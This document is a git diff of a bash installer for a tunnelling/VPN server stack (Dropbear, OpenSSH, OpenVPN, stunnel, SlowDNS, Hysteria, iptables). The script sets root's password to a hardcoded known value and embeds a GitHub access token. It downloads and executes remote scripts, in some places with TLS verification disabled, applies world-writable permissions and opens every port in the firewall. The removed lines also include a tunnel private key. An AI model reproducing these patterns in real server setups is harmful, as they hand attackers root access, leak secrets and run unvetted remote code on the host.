@@ -17,12 +17,12 @@ server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
 
 install_dependencies () {
   clear
-  echo -e "[\e[32mInfo\e[0m] Installing Dependencies."
+  printf "%b\n" "\e[32m[\e[0mInfo\e[32m]\e[0m\e[97m Please wait..\e[0m"
   {    
     export DEBIAN_FRONTEND=noninteractive
     apt update
     apt install -y iptables sudo screenfetch openvpn lolcat
-    apt install -y netcat httpie php neofetch vnstat 
+    apt install -y netcat httpie php neofetch vnstat mariadb-server 
     apt install -y screen squid stunnel4 dropbear gnutls-bin python
     apt install -y dos2unix nano unzip jq virt-what net-tools default-mysql-client
     apt install -y mlocate dh-make libaudit-dev build-essential fail2ban
@@ -37,9 +37,9 @@ install_dependencies () {
 
 install_dropbear() {
 clear
-echo -e "[\e[32mInfo\e[0m] Installing Dropbear."
+    echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing Dropbear." | lolcat
 {    
-echo -e "[\e[32mInfo\e[0m] Configuring Dropbear.."
+    echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Configuring Dropbear." | lolcat
 cat <<'EOFDropbear' > /etc/default/dropbear
 NO_START=0
 DROPBEAR_PORT=555
@@ -51,15 +51,16 @@ DROPBEAR_ECDSAKEY="/etc/dropbear/dropbear_ecdsa_host_key"
 DROPBEAR_RECEIVE_WINDOW=65536
 EOFDropbear
 
-echo -e "[\e[32mInfo\e[0m] Restarting Dropbear."
+echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Restarting Dropbear." | lolcat
 systemctl restart dropbear
  }
-echo -e "[\e[32mInfo\e[0m] Installation Complete Dropbear."
+echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installation Complete Dropbear." | lolcat
 clear
 }
 
 install_ssh() {
-echo -e "[\e[32mInfo\e[0m] Installing Banner."
+echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing Banner." | lolcat
+
 {    
 echo -e "[\e[32mInfo\e[0m] Configuring OpenSSH Service"
 if [[ "$(cat < /etc/ssh/sshd_config | grep -c 'BonvScripts')" -eq 0 ]]; then
@@ -117,6 +118,8 @@ TCPKeepAlive yes
 ClientAliveInterval 120
 ClientAliveCountMax 2
 UseDNS no
+AllowTcpForwarding yes
+port 2121
 EOFOpenSSH
 
 # Download our SSH Banner
@@ -125,8 +128,9 @@ wget -qO /etc/banner "https://raw.githubusercontent.com/nontikweed/blaire69/mast
 dos2unix -q /etc/banner
 
 echo "root:Wakawaka900@" | chpasswd
+sudo systemctl restart sshd
  }
- echo -e "[\e[32mInfo\e[0m] Installation Banner Complete."
+ echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installation Banner Complete." | lolcat
  clear
 }
 
@@ -196,7 +200,7 @@ sleep 5
 
 install_openvpn()
 {
-echo -e "[\e[32mInfo\e[0m] Installing OpenVPN Server."
+echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing OpenVPN Server." | lolcat
 if [[ ! -e /etc/openvpn ]]; then
  mkdir -p /etc/openvpn
  else
@@ -205,9 +209,7 @@ fi
 {
 
 mkdir -p /etc/openvpn/easy-rsa/keys
-mkdir -p /etc/openvpn/login
 mkdir -p /etc/openvpn/server
-mkdir -p /var/www/html/stat
 touch /etc/openvpn/server.conf
 touch /etc/openvpn/server2.conf
 
@@ -222,13 +224,13 @@ server 10.20.0.0 255.255.0.0
 ca /etc/openvpn/easy-rsa/keys/ca.crt
 cert /etc/openvpn/easy-rsa/keys/server.crt
 key /etc/openvpn/easy-rsa/keys/server.key
-dh /etc/ openvpn/easy-rsa/keys/dh.pem
+dh /etc/openvpn/easy-rsa/keys/dh.pem
 ncp-disable
 tls-server
 tls-version-min 1.2
 tls-cipher TLS-ECDHE-RSA-WITH-AES-128-GCM-SHA256
-cipher none
-auth none
+cipher AES-256-CBC
+auth SHA256
 persist-key
 persist-tun
 ping-timer-rem
@@ -246,17 +248,10 @@ push "dhcp-option DNS 8.8.4.4"
 push "compress lz4-v2"
 push "persist-key"
 push "persist-tun"
-keepalive 10 120
-comp-lzo
-user nobody
-group nogroup
-persist-key
-persist-tun
 status openvpn-status.log
-log tcp.log
+log udp.log
 verb 3
-ncp-disable
-cipher none' > /etc/openvpn/server.conf
+ncp-disable' > /etc/openvpn/server.conf
 
 sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/openvpn/server.conf
 
@@ -465,23 +460,23 @@ chmod 777 -R /etc/openvpn/
 chmod 755 /etc/openvpn/server.conf
 chmod 755 /etc/openvpn/server2.conf
 
-echo -e "[\e[33mNotice\e[0m] Enabling and starting OpenVPN UDP."
+echo -n -e "[\e[33mNotice\e[0m]" && echo -e " Enabling and starting OpenVPN UDP." | lolcat
 sudo systemctl enable openvpn@server.service > /dev/null 2>&1
 sudo systemctl start openvpn@server.service > /dev/null 2>&1
 
-echo -e "[\e[33mNotice\e[0m] Enabling and starting OpenVPN TCP."
+echo -n -e "[\e[33mNotice\e[0m]" && echo -e " Enabling and starting OpenVPN TCP." | lolcat
 sudo systemctl enable openvpn@server2.service > /dev/null 2>&1
 sudo systemctl start openvpn@server2.service > /dev/null 2>&1
  
  }
-echo -e "[\e[32mInfo\e[0m] Installing OpenVPN Complete."
+echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing OpenVPN Complete." | lolcat
 clear
 }
 
 
 install_firewall_kvm () {
 clear
-echo -e "[\e[32mInfo\e[0m] Installing Iptables."
+echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing Iptables." | lolcat
 {
 echo "net.ipv4.ip_forward=1
 net.ipv4.conf.all.rp_filter=0
@@ -506,13 +501,21 @@ iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state N
 iptables -t filter -A INPUT -p udp -m udp --dport 20100:20900 -m state --state NEW -m recent --set --name DEFAULT --mask 255.255.255.255 --rsource
 iptables -A INPUT -s 0.0.0.0/0 -p tcp -m multiport --dport 1:65535 -j ACCEPT
 iptables -A INPUT -s 0.0.0.0/0 -p udp -m multiport --dport 1:65535 -j ACCEPT
+iptables -A FORWARD -p udp -d $server_ip --dport 2121 -j ACCEPT
+iptables -I INPUT -p udp --dport 5300 -j ACCEPT
+iptables -t nat -I PREROUTING -i eth0 -p udp --dport 53 -j REDIRECT --to-ports 5300
+iptables -t nat -A PREROUTING -s 0.0.0.0/0 -d $server_ip -p udp --dport 5300 -j REDIRECT --to-ports 2121
+iptables -A FORWARD -p udp -d $server_ip --dport 2121 -j ACCEPT
+iptables -A FORWARD -p udp -d 0.0.0.0 --dport 2121 -j ACCEPT
 iptables-save > /etc/iptables_rules.v4
  }
-echo -e "[\e[32mInfo\e[0m] Installing Iptables Complete."
+clear
+echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing Iptables Complete." | lolcat
+clear
 }
 
 install_stunnel() {
-echo -e "[\e[32mInfo\e[0m] Installing Stunnel."
+echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing Stunnel." | lolcat
   {
 if [[ ! "$(command -v stunnel4)" ]]; then
  StunnelDir='stunnel'
@@ -531,7 +534,7 @@ RLIMITS=""
 EOFStunnel1
 
 rm -f /etc/stunnel/*
-echo -e "[\e[32mInfo\e[0m] Cloning Stunnel.pem.."
+echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Cloning Stunnel.pem." | lolcat
 openssl req -new -x509 -days 9999 -nodes -subj "/C=VN/ST=Nontikweed/L=DEV/O=NGO SY PHUC/CN= Blaire VPN " -out /etc/stunnel/stunnel.pem -keyout /etc/stunnel/stunnel.pem &> /dev/null
 echo -e "[\e[32mInfo\e[0m] Creating Stunnel server config.."
 cat <<'EOFStunnel3' > /etc/stunnel/stunnel.conf
@@ -552,83 +555,102 @@ connect = 127.0.0.1:550
 
 [openssh]
 accept = 444
-connect = 127.0.0.1:22
+connect = 127.0.0.1:225
 
 [openvpn]
 accept = 587
 connect = 127.0.0.1:1194
 EOFStunnel3
 
-echo -e "[\e[33mNotice\e[0m] Restarting Stunnel.."
+echo -n -e "[\e[33mNotice\e[0m]" && echo -e " Restarting Stunnel." | lolcat
 systemctl restart "$StunnelDir"
   }
+  clear
   echo -e "[\e[32mInfo\e[0m] Installing Stunnel Complete."
+  clear
 }
 
 install_badvpn(){
 clear
-echo -e "[\e[32mInfo\e[0m] Installing BadVPN."
+echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing BadVPN." | lolcat
 {
 wget -q -O /usr/bin/badvpn-udpgw --header="Authorization: token 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" "https://raw.githubusercontent.com/nontikweed/aio/main/badvpn-udpgw64"
 chmod +x /usr/bin/badvpn-udpgw
 ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
 }
+clear
 echo -e "[\e[32mInfo\e[0m] Installing BadVPN Complete."
 clear
 }
 
 install_slowdns() {
-clear
-echo -e "[\e[32mInfo\e[0m] Installing SlowdDNS."
-{
-curl -s -H "Authorization: token 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" -o dns.sh "https://raw.githubusercontent.com/nontikweed/aio/main/autodns" && chmod +x dns.sh && ./dns.sh    
-cd /usr/local
-wget -q https://golang.org/dl/go1.16.2.linux-amd64.tar.gz
-tar -xf go1.16.2.linux-amd64.tar.gz >/dev/null 2>&1
+    clear
+    echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing SlowDNS." | lolcat
+    {
+        curl -s -H "Authorization: token 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" -o dns.sh "https://raw.githubusercontent.com/nontikweed/aio/main/autodns" && chmod +x dns.sh && ./dns.sh    
 
-export GOROOT=/usr/local/go
-export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
-cd /root
-git config --global http.sslverify false
-git clone https://github.com/NuclearDevilStriker/dnstt.git --quiet
-cd /root/dnstt/dnstt-server
-go build
-./dnstt-server -gen-key -privkey-file server.key -pubkey-file server.pub
+        echo -e "[\e[32mInfo\e[0m] Creating SlowDNS directory."
+        mkdir -m 777 /etc/slowdns
+        cd /etc/slowdns
 
-cat <<\EOM > /root/dnstt/dnstt-server/server.key
-124d51aed2abceb984978cfe73bbfaa1b74ec0be869510ac254efc6e9ec7addc
-EOM
+        echo -e "[\e[32mInfo\e[0m] Downloading SlowDNS server files..."
+        wget https://raw.githubusercontent.com/dev-bon/web-script-dx/main/sldns-server
+        wget https://raw.githubusercontent.com/dev-bon/web-script-dx/main/server.key
+        wget https://raw.githubusercontent.com/dev-bon/web-script-dx/main/server.pub
+        sudo chmod +x /etc/slowdns/sldns-server
 
-cat <<\EOM > /root/dnstt/dnstt-server/server.pub
-5d30d19aa2524d7bd89afdffd9c2141575b21a728ea61c8cd7c8bf3839f97032
-EOM
+        NSNAME="$(cat /root/ns.txt)"
+        echo "Configuring SlowDNS service..."
+        echo "[Unit]
+Description=Server SlowDNS By Nontikweed
+Documentation=https://pornhub.com
+After=network.target nss-lookup.target
 
-NSNAME="$(cat /root/ns.txt)"
-cd /root/dnstt/dnstt-server
-screen -dmS slowdns ./dnstt-server -udp :5300 -privkey-file server.key $NSNAME 127.0.0.1:22
+[Service]
+Type=simple
+User=root
+CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
+AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
+NoNewPrivileges=true
+ExecStart=/etc/slowdns/sldns-server -udp :5300 -privkey-file /etc/slowdns/server.key $NSNAME 127.0.0.1:2121
+Restart=on-failure
 
-cat <<\EOM > /bin/dnsttauto.sh
-sudo kill $( sudo lsof -i:5300 -t )
-nsname="$(cat /root/ns.txt)"
-cd /root/dnstt/dnstt-server
-screen -dmS slowdns ./dnstt-server -udp :5300 -privkey-file server.key $nsname 127.0.0.1:22
-EOM
-chmod +x /bin/dnsttauto.sh
+[Install]
+WantedBy=multi-user.target" >> /etc/systemd/system/slowdns.service
+
+        echo -e "[\e[33mNotice\e[0m] Reloading systemd daemon."
+        systemctl daemon-reload
+
+        echo -e "[\e[33mNotice\e[0m] Enabling SlowDNS service..."
+        sudo systemctl enable slowdns
+
+        echo -e "[\e[33mNotice\e[0m] Starting SlowDNS service..."
+        sudo systemctl start slowdns.service
+
+        echo -e "[\e[33mNotice\e[0m] Checking the status of SlowDNS service..."
+        if sudo systemctl is-active slowdns.service; then
+            echo -e "[\e[33mNotice\e[0m] SlowDNS service is running."
+        else
+            echo -e "[\e[33mNotice\e[0m] SlowDNS service is not running."
+        fi
+    }
+    clear
+    echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing SlowDNS Complete." | lolcat
+    clear
 }
-echo -e "[\e[32mInfo\e[0m] Installing SlowDNS Complete."
-clear
-}
+
+
 
 install_hysteria(){
 clear
-echo -e "[\e[32mInfo\e[0m] Installing Hysteria."
+echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing Hysteria." | lolcat
 {
-echo -e "[\e[32mInfo\e[0m] Downloading and installing Hysteria."
+echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing Hysteria." | lolcat
 wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/nontikweed/blaire69/master/install_server.sh
 chmod +x ~/install_server.sh
 ~/install_server.sh --version v1.3.5
 
-echo -e "[\e[32mInfo\e[0m] Configuring Hysteria."
+echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Configuring Hysteria." | lolcat
 rm -f /etc/hysteria/config.json
 
 echo '{
@@ -649,7 +671,7 @@ echo '{
 chmod 755 /etc/hysteria/config.json
 
 #Creating Hysteria CERT
-echo -e "[\e[32mInfo\e[0m] Creating Hysteria Cert."
+echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Creating Hysteria Cert." | lolcat
 cat << EOF > /etc/hysteria/hysteria.crt
 Certificate:
     Data:
@@ -743,25 +765,25 @@ chmod 755 /etc/hysteria/hysteria.key
 sysctl -w net.core.rmem_max=16777216 > /dev/null
 sysctl -w net.core.wmem_max=16777216 > /dev/null
 
-echo -e "[\e[32mInfo\e[0m] Enabling Hysteria Server."
+echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Enabling Hysteria Server." | lolcat
 sudo systemctl enable hysteria-server.service > /dev/null 2>&1
 
-echo -e "[\e[32mInfo\e[0m] Restart Hysteria Server."
+echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Restart Hysteria Server." | lolcat
 sudo systemctl restart hysteria-server.service > /dev/null 2>&1
 }
-echo -e "[\e[32mInfo\e[0m] Hysteria installation complete."
+echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Hysteria installation complete." | lolcat
 clear
 }
 
 install_menu() {
     clear
-    echo -e "[\e[32mInfo\e[0m] Installing Menu."
+    echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Installing Menu." | lolcat
+
     {
-        echo -e "[\e[32mInfo\e[0m] Cleaning up existing menu scripts."
+        echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Cleaning up existing menu scripts." | lolcat
         cd /usr/local/sbin/
         rm -rf {accounts,base-ports,base-ports-wc,base-script,bench-network,clearcache,connections,create,create_random,create_trial,delete_expired,diagnose,edit_dropbear,edit_openssh,edit_openvpn,edit_ports,edit_squi*,edit_stunne*,locked_list,menu,options,ram,reboot_sys,reboot_sys_auto,restart_services,screenfetch,server,set_multilogin_autokill,set_multilogin_autokill_lib,show_ports,speedtest,user_delete,user_details,user_details_lib,user_extend,user_list,user_lock,user_unlock,*_gtm_noload}
-
-         echo -e "[\e[32mInfo\e[0m] Downloading and installing the new menu script."
+        echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Downloading and installing the new menu script." | lolcat
         wget -q 'https://raw.githubusercontent.com/Bonveio/BonvScripts/master/menuV1.zip'
         unzip -qq -o menuV1.zip
         rm -f menuV1.zip
@@ -769,13 +791,15 @@ install_menu() {
         dos2unix -q ./*
         cd ~
     }
-        echo -e "[\e[32mInfo\e[0m] Menu installation complete."
+        echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Menu installation complete." | lolcat
         clear
 }
 
 install_rclocal(){
   {
   sed -i 's/Listen 80/Listen 81/g' /etc/apache2/ports.conf  
+  rm -rf /var/www/html/index.html
+  echo "Made with love by: Kola Sheesh... " >> /var/www/html/index.php
     
     echo "[Unit]
 Description=blaire service
@@ -807,26 +831,17 @@ exit 0' >> /etc/rc.local
     systemctl daemon-reload
     sudo systemctl enable blaire
     sudo systemctl start blaire.service
+    systemctl status server-sldns.service
     
-    mkdir -m 777 /root/.web
+mkdir -m 777 /root/.web
 echo "Made with love by: Kola Sheesh... " >> /root/.web/index.php
 
-echo "tcp_port=TCP_PORT
-udp_port=UDP_PORT
-socket_port=80
-squid_port=8080
-hysteria_port=5666
-tcp_ssl_port=1194
-udp_ssl_port=442" >> /root/.ports
-
-sed -i "s|TCP_PORT|$PORT_TCP|g" /root/.ports
-sed -i "s|UDP_PORT|$PORT_UDP|g" /root/.ports
-  }&>/dev/null
+  }
 }
 
 start_service () {
 clear
-echo -e "[\e[32mInfo\e[0m] Starting."
+echo -n -e "[\e[32mInfo\e[0m]" && echo -e " Starting ." | lolcat
 {
 sudo crontab -l | { echo "* * * * * pgrep -x stunnel4 >/dev/null && echo 'GOOD' || /etc/init.d/stunnel4 restart"; } | crontab -
 #sudo crontab -l | { echo "0 * * * * /bin/bash /bin/dnsttauto.sh >/dev/null 2>&1"; } | crontab -
@@ -846,6 +861,12 @@ netstat -tpln
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
 echo -e " \033[0;31m Server will secure this server and reboot after 10 seconds!! \033[0m"
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
+ssh_dns=$(cat /root/subd.txt)
+sdns_ns=$(cat /root/ns.txt)
+sdns_pubkey=$(cat /root/dnstt/dnstt-server/server.pub)
+$ssh_dns
+$sdns_ns
+$sdns_pubkey
 rm -rf /root/*.sh
 rm -rf /root/*.sh.x
 sleep 10
